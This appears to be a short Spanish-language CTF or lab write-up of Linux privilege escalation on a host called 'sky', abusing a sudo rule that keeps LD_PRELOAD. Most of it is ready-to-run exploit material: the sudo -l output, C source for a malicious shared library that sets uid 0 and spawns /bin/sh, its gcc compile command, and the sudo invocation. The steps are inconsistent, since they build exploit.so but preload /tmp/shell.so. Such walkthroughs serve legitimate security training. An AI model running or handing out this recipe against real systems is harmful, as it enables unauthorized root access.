# Ejecutamos que permisos tiene de ejecucion el usuario
`webdeveloper@sky:~$ sudo -l`
	
	Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

	User webdeveloper may run the following commands on sky:
    	(ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility

##### Si visualizamos LD_PRELOAD se puede explotar

##### Nos movemos a la carpeta /tmp
`$ cd /tmp`

##### Creamos un archivo llamado exploit con extension c
`$ nano exploit.c`

## Escribimos el siguiente codigo
	
	#include <stdio.h>
	#include <sys/types.h>
	#include <stdlib.h>
	void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/sh");
	}

##### Lo guardamos y ahora lo compilamos de la siguiente manera
`$ gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles`

##### Ahora ejecutamos el archivo con sudo
*Nota: se debe de ejecutar con el script que tenga permitido ejecutar como root*

`$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility`
